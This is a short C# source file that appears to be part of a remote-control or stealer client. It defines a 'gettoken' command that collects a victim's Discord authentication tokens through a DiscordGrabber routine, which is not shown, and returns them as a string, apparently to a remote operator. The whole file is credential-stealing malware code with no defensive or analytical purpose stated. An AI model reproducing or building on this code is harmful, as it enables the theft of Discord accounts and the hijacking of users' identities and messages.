using System;
using System.Linq;

namespace Client.Commands
{
    class getToken : Command
    {
        public getToken(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 0) return "Expected argument for gettoken";
            try
            {
                switch (args.First())
                {
                    case "discord":
                        string tokenList = "";

                        foreach (string token in DiscordGrabber.GetTokens()) tokenList += token + ", ";

                        return tokenList;

                    default:
                        return "Unexpected argument " + args[0];
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
    }
}
